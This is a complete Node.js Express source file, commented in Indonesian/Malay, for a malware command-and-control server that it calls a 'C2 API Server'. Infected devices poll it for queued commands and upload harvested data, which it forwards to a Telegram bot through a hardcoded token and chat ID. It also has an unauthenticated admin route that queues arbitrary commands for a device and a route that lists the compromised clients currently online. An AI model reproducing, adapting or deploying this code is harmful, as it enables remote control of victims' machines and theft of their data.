const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const app = express();

app.use(bodyParser.json());

// ==========================================
// KONFIGURASI TELEGRAM PAKCIK
// ==========================================
const TG_TOKEN = "9165602208:AAHhpX7c7nuVDN2J4N-u0sioRCaE4BuyuRw";
const TG_CHAT_ID = "8831607999";

// ==========================================
// PENYIMPANAN DATA (In-Memory)
// ==========================================
let activeClients = {}; 
let commandQueue = {};  

// ==========================================
// ENDPOINT 1: CLIENT MINTA PERINTAH (GET)
// ==========================================
app.get('/api/cmd/:device_id', (req, res) => {
    const devId = req.params.device_id;
    activeClients[devId] = Date.now(); // Update heartbeat
    
    const cmd = commandQueue[devId] || "";
    commandQueue[devId] = ""; // Hapus command setelah diambil
    
    res.json({ command: cmd, status: "ok" });
});

// ==========================================
// ENDPOINT 2: CLIENT KIRIM DATA (POST)
// ==========================================
app.post('/api/upload', async (req, res) => {
    const { device_id, type, payload } = req.body;
    
    activeClients[device_id] = Date.now();
    
    // Format pesan buat Telegram
    let msg = `📥 [${device_id}] ${type.toUpperCase()}\n\`\`\`\n${payload}\n\`\`\``;
    
    // Kirim ke Telegram
    try {
        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            chat_id: TG_CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
    } catch (e) {
        console.error("Telegram Error:", e.message);
    }

    res.json({ status: "received" });
});

// ==========================================
// ENDPOINT 3: ADMIN (PAKCIK) NARO PERINTAH
// ==========================================
// Cara akses: http://ip-server:8080/admin/send/DEVICE_ID/PERINTAH
app.get('/admin/send/:device_id/:cmd', (req, res) => {
    const devId = req.params.device_id;
    const cmd = req.params.cmd;
    
    commandQueue[devId] = cmd;
    res.send(`[+] Perintah "${cmd}" dimasukkan ke antrean untuk device: ${devId}`);
});

// ==========================================
// ENDPOINT 4: ADMIN LIHAT CLIENT ONLINE
// ==========================================
app.get('/admin/clients', (req, res) => {
    let list = "🟢 **Active Clients:**\n";
    for (let id in activeClients) {
        const lastSeen = Math.floor((Date.now() - activeClients[id]) / 1000);
        list += `- ${id} (Last ping: ${lastSeen}s ago)\n`;
    }
    res.send(list);
});

// ==========================================
// JALANIN SERVER
// ==========================================
const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`[+] C2 API Server jalan di http://0.0.0.0:${PORT}`);
    console.log(`[+] Admin Panel: http://IP-SERVER:${PORT}/admin/clients`);
});
